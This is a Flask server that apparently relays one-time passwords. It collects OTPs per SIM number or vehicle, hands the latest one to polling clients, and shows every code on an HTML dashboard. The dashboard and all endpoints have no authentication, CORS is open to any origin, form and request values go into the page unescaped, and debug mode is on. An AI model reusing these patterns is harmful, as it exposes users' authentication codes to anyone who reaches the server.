from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import zoneinfo

app = Flask(__name__)
CORS(app)

# =========================
# Storage
# =========================
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":...}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]
otp_data = {}      # token -> list of OTPs
client_sessions = {}  # (token, sim_number/vehicle) -> {"first_request": datetime}
login_sessions = {}   # mobile_number -> {"timestamp": datetime}

IST = zoneinfo.ZoneInfo("Asia/Kolkata")

# =========================
# Helpers
# =========================
def now_str():
    return datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")

# =========================
# OTP Endpoints
# =========================
@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        token = (data.get('token') or "").strip()
        vehicle = (data.get('vehicle') or "").strip().upper()

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": datetime.now(IST)
        }

        if vehicle:
            entry["vehicle"] = vehicle
            vehicle_otps.append(entry)
        else:
            entry["sim_number"] = sim_number or "UNKNOWNSIM"
            mobile_otps.append(entry)

        return jsonify({"status": "success", "message": "OTP stored"}), 200
    except Exception as e:
        print("Error receiving from app:", e)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()

    if not token or (not sim_number and not vehicle):
        return jsonify({"status": "error", "message": "token + sim_number OR token + vehicle required"}), 400

    key = (token, sim_number if sim_number else vehicle)
    if key not in client_sessions:
        client_sessions[key] = {"first_request": datetime.now(IST)}
    session_time = client_sessions[key]["first_request"]

    if vehicle:
        new_otps = [o for o in vehicle_otps if o["token"] == token and o.get("vehicle","").upper() == vehicle and o["timestamp"] > session_time]
        if new_otps:
            latest = new_otps[-1]
            vehicle_otps[:] = [o for o in vehicle_otps if not (o["token"] == token and o.get("vehicle","").upper() == vehicle)]
            client_sessions.pop(key, None)
            # move to otp_data
            otp_data.setdefault(token, []).append(latest)
            return jsonify({"status":"success","otp":latest["otp"],"vehicle":latest["vehicle"],"timestamp":latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")}),200
        return jsonify({"status":"empty","message":"No new vehicle OTP"}),200
    else:
        new_otps = [o for o in mobile_otps if o["token"]==token and o.get("sim_number","").upper()==sim_number and o["timestamp"]>session_time]
        if new_otps:
            latest = new_otps[-1]
            mobile_otps[:] = [o for o in mobile_otps if not (o["token"]==token and o.get("sim_number","").upper()==sim_number)]
            client_sessions.pop(key, None)
            # move to otp_data
            otp_data.setdefault(token, []).append(latest)
            return jsonify({"status":"success","otp":latest["otp"],"sim_number":latest["sim_number"],"timestamp":latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")}),200
        return jsonify({"status":"empty","message":"No new mobile OTP"}),200

# =========================
# Status / Dashboard
# =========================
@app.route('/api/status', methods=['GET', 'POST'])
def status():
    global otp_data, login_sessions

    # Handle POST for deletions
    if request.method == 'POST':
        if "delete_selected_otps" in request.form:
            tokens_to_delete = request.form.getlist("otp_rows")
            for t, idx in (x.split(":") for x in tokens_to_delete):
                idx = int(idx)
                if t in otp_data and 0 <= idx < len(otp_data[t]):
                    otp_data[t].pop(idx)
                    if not otp_data[t]:
                        otp_data.pop(t)
        elif "delete_selected_logins" in request.form:
            logins_to_delete = request.form.getlist("login_rows")
            for m in logins_to_delete:
                login_sessions.pop(m, None)

    # Prepare OTP table rows
    otp_rows = ""
    for t, entries in otp_data.items():
        for i, e in enumerate(entries):
            otp_rows += f"""
            <tr>
                <td><input type='checkbox' name='otp_rows' value='{t}:{i}'></td>
                <td>{t}</td>
                <td>{e.get('sim_number','')}</td>
                <td>{e.get('vehicle','')}</td>
                <td>{e.get('otp','')}</td>
                <td>{e['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
            </tr>
            """

    # Prepare Login table rows
    login_rows = ""
    for m, info in login_sessions.items():
        login_rows += f"""
        <tr>
            <td><input type='checkbox' name='login_rows' value='{m}'></td>
            <td>{m}</td>
            <td>{info['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
        </tr>
        """

    html = f"""
    <html>
    <head>
        <title>KM OTP Dashboard</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
        <style>
            body {{ font-family: 'Roboto', sans-serif; margin:0; padding:0; background:#f0f2f5; }}
            h2 {{ text-align:center; padding:20px; background:linear-gradient(90deg,#4b6cb7,#182848); color:white; margin:0; font-weight:500; letter-spacing:1px; }}
            .container {{ display:flex; min-height: calc(100vh - 70px); }}
            .sidebar {{ width:220px; background:#fff; box-shadow:2px 0 5px rgba(0,0,0,0.1); padding:20px; display:flex; flex-direction:column; }}
            .sidebar button {{ background:linear-gradient(90deg,#4b6cb7,#182848); color:white; border:none; padding:12px; margin-bottom:15px; border-radius:8px; cursor:pointer; font-weight:500; transition:0.3s; }}
            .sidebar button:hover {{ transform:translateX(5px); box-shadow:0 4px 15px rgba(0,0,0,0.2); }}
            .content {{ flex-grow:1; padding:30px; }}
            table {{ width:100%; border-collapse: collapse; background:white; box-shadow:0 2px 8px rgba(0,0,0,0.1); border-radius:8px; overflow:hidden; margin-bottom:15px; }}
            th, td {{ padding:12px 15px; text-align:left; }}
            th {{ background-color:#4b6cb7; color:white; font-weight:500; }}
            tr:nth-child(even) {{background:#f7f9fc;}}
            tr:hover {{background:#e0e7ff;}}
            .section-header {{ font-size:18px; font-weight:500; margin-bottom:10px; color:#333; }}
            .btn-delete {{ background:#ff4d4f; border:none; color:white; padding:6px 12px; border-radius:6px; cursor:pointer; font-size:13px; transition:0.3s; }}
            .btn-delete:hover {{ background:#ff7875; }}
            form button[type="submit"] {{ margin-top:15px; background:#4b6cb7; color:white; border:none; padding:10px 15px; border-radius:6px; cursor:pointer; font-weight:500; transition:0.3s; }}
            form button[type="submit"]:hover {{ background:#182848; }}
        </style>
        <script>
            function showSection(id){{
                document.getElementById('otp_section').style.display = id=='otp_section'?'block':'none';
                document.getElementById('login_section').style.display = id=='login_section'?'block':'none';
            }}
        </script>
    </head>
    <body>
        <h2>KM OTP Dashboard</h2>
        <div class="container">
            <div class="sidebar">
                <button onclick="showSection('otp_section')">OTP DATA</button>
                <button onclick="showSection('login_section')">CLEAR LOGIN IDS</button>
            </div>
            <div class="content">
                <div id="otp_section" style="display:none;">
                    <div class="section-header">OTP Data</div>
                    <form method="POST">
                        <table>
                            <tr>
                                <th>Select</th>
                                <th>TOKEN</th>
                                <th>MOBILE NUMBER</th>
                                <th>VEHICLE</th>
                                <th>OTP</th>
                                <th>DATE</th>
                            </tr>
                            {otp_rows if otp_rows else '<tr><td colspan="6">No OTPs found</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_otps">Delete Selected</button>
                    </form>
                </div>

                <div id="login_section" style="display:none;">
                    <div class="section-header">Login IDs</div>
                    <form method="POST">
                        <table>
                            <tr>
                                <th>Select</th>
                                <th>MOBILE NUMBER</th>
                                <th>DATE</th>
                            </tr>
                            {login_rows if login_rows else '<tr><td colspan="3">No login sessions found</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_logins">Delete Selected</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return html

# =========================
# Login Detection
# =========================
@app.route('/api/login-detect', methods=['POST'])
def login_detect():
    try:
        data = request.get_json(force=True)
        mobile_number = (data.get('mobile_number') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400
        login_sessions[mobile_number] = {"timestamp": datetime.now(IST)}
        return jsonify({"status": "success", "message": "Login detected"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/login-found', methods=['GET'])
def login_found():
    mobile_number = (request.args.get('mobile_number') or "").strip().upper()
    if not mobile_number:
        return jsonify({"status": "error", "message": "mobile_number required"}), 400
    if mobile_number in login_sessions:
        ts = login_sessions[mobile_number]["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
        return jsonify({"status": "found", "mobile_number": mobile_number, "timestamp": ts}), 200
    else:
        return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200

# =========================
# Run App
# =========================
if __name__ == '__main__':
    app.run(debug=True)
